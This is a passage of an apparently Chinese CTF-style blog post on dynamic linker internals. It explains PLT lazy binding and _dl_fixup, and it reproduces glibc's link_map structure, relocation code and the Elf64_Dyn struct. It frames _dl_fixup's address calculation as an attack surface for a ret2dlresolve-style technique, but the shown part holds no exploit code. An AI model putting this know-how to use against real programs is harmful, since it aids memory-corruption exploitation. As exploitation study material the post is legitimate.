<li>在 PLT[0] 表中：先 push <code>link_map</code>（为 <code>_dl_fixup</code> 提供信息），然后执行 <code>_dl_runtime_resolve_fxsave</code> 函数</li>
<li>接着使用 <code>_dl_fixup</code> 函数来查找目标在动态链接库中的地址</li>
<li>最后把对应 GOT 表地址修改为库函数的真实地址</li>
</ul>
<p><code>_dl_fixup(struct link_map *l, ElfW(Word) reloc_arg)</code> 接受两个参数，一个“链接映射”和一个“重定位索引”</p>
<ul>
<li>“链接映射”：将有关 ELF 的所有相关信息包装成一个数据结构 <code>link_map</code></li>
<li>“重定位索引”：用于确定该函数在 PLT/GOT 表中的位置</li>
</ul>
<p>结构体 <code>link_map</code> 如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">link_map</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="comment">/* These first few members are part of the protocol with the debugger.</span></span><br><span class="line"><span class="comment">       This is the same format used in SVR4.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Addr) l_addr;		<span class="comment">/* Difference between the address in the ELF</span></span><br><span class="line"><span class="comment">				   file and the addresses in memory.  */</span></span><br><span class="line">    <span class="keyword">char</span> *l_name;		<span class="comment">/* Absolute file name object was found in.  */</span></span><br><span class="line">    ElfW(Dyn) *l_ld;		<span class="comment">/* Dynamic section of the shared object.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_next</span>, *<span class="title">l_prev</span>;</span> <span class="comment">/* Chain of loaded objects.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* All following members are internal to the dynamic linker.</span></span><br><span class="line"><span class="comment">       They may change without notice.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This is an element which is only ever different from a pointer to</span></span><br><span class="line"><span class="comment">       the very same copy of this type for ld.so when it is used in more</span></span><br><span class="line"><span class="comment">       than one namespace.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_real</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of the namespace this link map belongs to.  */</span></span><br><span class="line">    Lmid_t l_ns;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">libname_list</span> *<span class="title">l_libname</span>;</span></span><br><span class="line">    <span class="comment">/* Indexed pointers to dynamic section.</span></span><br><span class="line"><span class="comment">       [0,DT_NUM) are indexed by the processor-independent tags.</span></span><br><span class="line"><span class="comment">       [DT_NUM,DT_NUM+DT_THISPROCNUM) are indexed by the tag minus DT_LOPROC.</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM,DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VERSIONTAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM) are indexed by</span></span><br><span class="line"><span class="comment">       DT_EXTRATAGIDX(tagvalue).</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM) are</span></span><br><span class="line"><span class="comment">       indexed by DT_VALTAGIDX(tagvalue) and</span></span><br><span class="line"><span class="comment">       [DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM,</span></span><br><span class="line"><span class="comment">	DT_NUM+DT_THISPROCNUM+DT_VERSIONTAGNUM+DT_EXTRANUM+DT_VALNUM+DT_ADDRNUM)</span></span><br><span class="line"><span class="comment">       are indexed by DT_ADDRTAGIDX(tagvalue), see &lt;elf.h&gt;.  */</span></span><br><span class="line"></span><br><span class="line">    ElfW(Dyn) *l_info[DT_NUM + DT_THISPROCNUM + DT_VERSIONTAGNUM</span><br><span class="line">                      + DT_EXTRANUM + DT_VALNUM + DT_ADDRNUM];</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Phdr)</span> *l_phdr</span>;	<span class="comment">/* Pointer to program header table in core.  */</span></span><br><span class="line">    ElfW(Addr) l_entry;		<span class="comment">/* Entry point location.  */</span></span><br><span class="line">    ElfW(Half) l_phnum;		<span class="comment">/* Number of program header entries.  */</span></span><br><span class="line">    ElfW(Half) l_ldnum;		<span class="comment">/* Number of dynamic segment entries.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array of DT_NEEDED dependencies and their dependencies, in</span></span><br><span class="line"><span class="comment">       dependency order for symbol lookup (with and without</span></span><br><span class="line"><span class="comment">       duplicates).  There is no entry before the dependencies have</span></span><br><span class="line"><span class="comment">       been loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* We need a special searchlist to process objects marked with</span></span><br><span class="line"><span class="comment">       DT_SYMBOLIC.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> <span class="title">l_symbolic_searchlist</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Dependent object that first caused this object to be loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l_loader</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Array with version names.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">l_versions</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_nversions;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Symbol hash table.  */</span></span><br><span class="line">    Elf_Symndx l_nbuckets;</span><br><span class="line">    Elf32_Word l_gnu_bitmask_idxbits;</span><br><span class="line">    Elf32_Word l_gnu_shift;</span><br><span class="line">    <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Addr)</span> *l_gnu_bitmask</span>;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_buckets;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_chain;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">const</span> Elf32_Word *l_gnu_chain_zero;</span><br><span class="line">        <span class="keyword">const</span> Elf_Symndx *l_buckets;</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_direct_opencount; <span class="comment">/* Reference count for dlopen/dlclose.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">enum</span>			/* <span class="title">Where</span> <span class="title">this</span> <span class="title">object</span> <span class="title">came</span> <span class="title">from</span>.  */</span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        lt_executable,		<span class="comment">/* The main executable program.  */</span></span><br><span class="line">            lt_library,		<span class="comment">/* Library needed by main executable.  */</span></span><br><span class="line">            lt_loaded		<span class="comment">/* Extra run-time loaded shared object.  */</span></span><br><span class="line">    &#125; l_type:<span class="number">2</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_relocated:<span class="number">1</span>;	<span class="comment">/* Nonzero if object&#x27;s relocations done.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_init_called:<span class="number">1</span>; <span class="comment">/* Nonzero if DT_INIT function called.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_global:<span class="number">1</span>;	<span class="comment">/* Nonzero if object in _dl_global_scope.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reserved:<span class="number">2</span>;	<span class="comment">/* Reserved for internal use.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_main_map:<span class="number">1</span>;  <span class="comment">/* Nonzero for the map of the main program.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_visited:<span class="number">1</span>;   <span class="comment">/* Used internally for map dependency</span></span><br><span class="line"><span class="comment">				   graph traversal.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_map_used:<span class="number">1</span>;  <span class="comment">/* These two bits are used during traversal */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_map_done:<span class="number">1</span>;  <span class="comment">/* of maps in _dl_close_worker. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_phdr_allocated:<span class="number">1</span>; <span class="comment">/* Nonzero if the data structure pointed</span></span><br><span class="line"><span class="comment">					to by `l_phdr&#x27; is allocated.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_soname_added:<span class="number">1</span>; <span class="comment">/* Nonzero if the SONAME is for sure in</span></span><br><span class="line"><span class="comment">				      the l_libname list.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_faked:<span class="number">1</span>;	<span class="comment">/* Nonzero if this is a faked descriptor</span></span><br><span class="line"><span class="comment">				   without associated file.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_need_tls_init:<span class="number">1</span>; <span class="comment">/* Nonzero if GL(dl_init_static_tls)</span></span><br><span class="line"><span class="comment">				       should be called on this link map</span></span><br><span class="line"><span class="comment">				       when relocation finishes.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_auditing:<span class="number">1</span>;	<span class="comment">/* Nonzero if the DSO is used in auditing.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_audit_any_plt:<span class="number">1</span>; <span class="comment">/* Nonzero if at least one audit module</span></span><br><span class="line"><span class="comment">				       is interested in the PLT interception.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_removed:<span class="number">1</span>;	<span class="comment">/* Nozero if the object cannot be used anymore</span></span><br><span class="line"><span class="comment">				   since it is removed.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_contiguous:<span class="number">1</span>; <span class="comment">/* Nonzero if inter-segment holes are</span></span><br><span class="line"><span class="comment">				    mprotected or if no holes are present at</span></span><br><span class="line"><span class="comment">				    all.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_symbolic_in_local_scope:<span class="number">1</span>; <span class="comment">/* Nonzero if l_local_scope</span></span><br><span class="line"><span class="comment">						 during LD_TRACE_PRELINKING=1</span></span><br><span class="line"><span class="comment">						 contains any DT_SYMBOLIC</span></span><br><span class="line"><span class="comment">						 libraries.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_free_initfini:<span class="number">1</span>; <span class="comment">/* Nonzero if l_initfini can be</span></span><br><span class="line"><span class="comment">				       freed, ie. not allocated with</span></span><br><span class="line"><span class="comment">				       the dummy malloc in ld.so.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_ld_readonly:<span class="number">1</span>; <span class="comment">/* Nonzero if dynamic section is readonly.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_find_object_processed:<span class="number">1</span>; <span class="comment">/* Zero if _dl_find_object_update</span></span><br><span class="line"><span class="comment">					       needs to process this</span></span><br><span class="line"><span class="comment">					       lt_library map.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* NODELETE status of the map.  Only valid for maps of type</span></span><br><span class="line"><span class="comment">       lt_loaded.  Lazy binding sets l_nodelete_active directly,</span></span><br><span class="line"><span class="comment">       potentially from signal handlers.  Initial loading of an</span></span><br><span class="line"><span class="comment">       DF_1_NODELETE object set l_nodelete_pending.  Relocation may</span></span><br><span class="line"><span class="comment">       set l_nodelete_pending as well.  l_nodelete_pending maps are</span></span><br><span class="line"><span class="comment">       promoted to l_nodelete_active status in the final stages of</span></span><br><span class="line"><span class="comment">       dlopen, prior to calling ELF constructors.  dlclose only</span></span><br><span class="line"><span class="comment">       refuses to unload l_nodelete_active maps, the pending status is</span></span><br><span class="line"><span class="comment">       ignored.  */</span></span><br><span class="line">    <span class="keyword">bool</span> l_nodelete_active;</span><br><span class="line">    <span class="keyword">bool</span> l_nodelete_pending;</span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;link_map.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_rpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected results of relocation while profiling.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">reloc_result</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        DL_FIXUP_VALUE_TYPE addr;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">bound</span>;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> boundndx;</span><br><span class="line">        <span class="keyword">uint32_t</span> enterexit;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> flags;</span><br><span class="line">        <span class="comment">/* CONCURRENCY <span class="doctag">NOTE:</span> This is used to guard the concurrent initialization</span></span><br><span class="line"><span class="comment">	 of the relocation result across multiple threads.  See the more</span></span><br><span class="line"><span class="comment">	 detailed notes in elf/dl-runtime.c.  */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> init;</span><br><span class="line">    &#125; *l_reloc_result;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Pointer to the version information if available.  */</span></span><br><span class="line">    ElfW(Versym) *l_versyms;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* String specifying the path where this object was found.  */</span></span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span> *l_origin;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start and finish of memory map for this object.  l_map_start</span></span><br><span class="line"><span class="comment">       need not be the same as l_addr.  */</span></span><br><span class="line">    ElfW(Addr) l_map_start, l_map_end;</span><br><span class="line">    <span class="comment">/* End of the executable part of the mapping.  */</span></span><br><span class="line">    ElfW(Addr) l_text_end;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Default array for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_scope_mem</span>[4];</span></span><br><span class="line">    <span class="comment">/* Size of array allocated for &#x27;l_scope&#x27;.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_scope_max;</span><br><span class="line">    <span class="comment">/* This is an array defining the lookup scope for this link map.</span></span><br><span class="line"><span class="comment">       There are initially at most three different scope lists.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> **<span class="title">l_scope</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* A similar array, this time only with the local scope.  This is</span></span><br><span class="line"><span class="comment">       used occasionally.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_scope_elem</span> *<span class="title">l_local_scope</span>[2];</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* This information is kept to check for sure whether a shared</span></span><br><span class="line"><span class="comment">       object is the same as one already loaded.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_file_id</span> <span class="title">l_file_id</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Collected information about own RUNPATH directories.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">r_search_path_struct</span> <span class="title">l_runpath_dirs</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of object in order of the init and fini calls.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> **<span class="title">l_initfini</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* List of the dependencies introduced through symbol binding.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_reldeps</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> act;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">list</span>[];</span></span><br><span class="line">    &#125; *l_reldeps;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_reldepsmax;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nonzero if the DSO is used.  */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> l_used;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Various flag words.  */</span></span><br><span class="line">    ElfW(Word) l_feature_1;</span><br><span class="line">    ElfW(Word) l_flags_1;</span><br><span class="line">    ElfW(Word) l_flags;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Temporarily used in `dl_close&#x27;.  */</span></span><br><span class="line">    <span class="keyword">int</span> l_idx;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">link_map_machine</span> <span class="title">l_mach</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym</span>;</span><br><span class="line">        <span class="keyword">int</span> type_class;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">value</span>;</span></span><br><span class="line">        <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *ret</span>;</span><br><span class="line">    &#125; l_lookup_cache;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Thread-local storage related info.  */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Start of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">void</span> *l_tls_initimage;</span><br><span class="line">    <span class="comment">/* Size of the initialization image.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_initimage_size;</span><br><span class="line">    <span class="comment">/* Size of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_blocksize;</span><br><span class="line">    <span class="comment">/* Alignment requirement of the TLS block.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_align;</span><br><span class="line">    <span class="comment">/* Offset of first byte module alignment.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_firstbyte_offset;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> NO_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">define</span> NO_TLS_OFFSET	0</span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> FORCED_DYNAMIC_TLS_OFFSET</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">if</span> NO_TLS_OFFSET == 0</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -1</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">elif</span> NO_TLS_OFFSET == -1</span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">define</span> FORCED_DYNAMIC_TLS_OFFSET -2</span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="meta">#  <span class="meta-keyword">error</span> <span class="meta-string">&quot;FORCED_DYNAMIC_TLS_OFFSET is not defined&quot;</span></span></span><br><span class="line">    <span class="meta"># <span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="comment">/* For objects present at startup time: offset in the static TLS block.  */</span></span><br><span class="line">    <span class="keyword">ptrdiff_t</span> l_tls_offset;</span><br><span class="line">    <span class="comment">/* Index of the module in the dtv array.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_modid;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of thread_local objects constructed by this DSO.  This is</span></span><br><span class="line"><span class="comment">       atomically accessed and modified and is not always protected by the load</span></span><br><span class="line"><span class="comment">       lock.  See also: CONCURRENCY NOTES in cxa_thread_atexit_impl.c.  */</span></span><br><span class="line">    <span class="keyword">size_t</span> l_tls_dtor_count;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Information used to change permission after the relocations are</span></span><br><span class="line"><span class="comment">       done.  */</span></span><br><span class="line">    ElfW(Addr) l_relro_addr;</span><br><span class="line">    <span class="keyword">size_t</span> l_relro_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> <span class="keyword">int</span> l_serial;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><code>_dl_fixup</code> 将使用“链接映射”来确定“重定位索引”所指的符号，并提供大量其他需要的信息来进行符号解析，其中最重要的就是“解析地址”计算</p>
<ul>
<li><code>_dl_fixup</code> 利用存储在 <code>link_map</code> 中的信息来确定符号 <code>@got</code>（称为“解析地址”）的位置</li>
<li>如果我们欺骗 <code>_dl_fixup</code> 计算错误的解析地址并且 <code>write@got</code> 仍然是 <code>write@plt+6</code>，利用这一点将是有价值的，我们永远不会在字节写入后丢失 <code>_dl_fixup</code> 作为攻击面</li>
</ul>
<p>实现重定位的代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc = (<span class="keyword">const</span> <span class="keyword">void</span> *)(D_PTR(l, l_info[DT_JMPREL]) + reloc_offset(pltgot, reloc_arg));</span><br><span class="line"><span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br></pre></td></tr></table></figure>
<p>当运行时加载器加载 ELF 时，它会通过 .dynamic 部分中的条目定位不同的数据结构，例如存储析构函数或 GOT 的位置，这是 .dynamic 部分的样子：</p>
<p><img src="/2022/08/23/dl_runtime_resolve%20attack+svcudp_reply%E6%8E%A7%E5%88%B6%E6%A0%88/1661098830166-1661242874520.png" alt="1661098830166"> </p>
<p>.dynamic 段中往往保存着多个元素，元素的数据结构为：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  Elf64_Sxword	d_tag;			<span class="comment">/* Dynamic entry type */</span></span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">    &#123;</span></span><br><span class="line">      Elf64_Xword d_val;		<span class="comment">/* Integer value */</span></span><br><span class="line">      Elf64_Addr d_ptr;			<span class="comment">/* Address value */</span></span><br><span class="line">    &#125; d_un;</span><br><span class="line">&#125; Elf64_Dyn;</span><br></pre></td></tr></table></figure>
<ul>
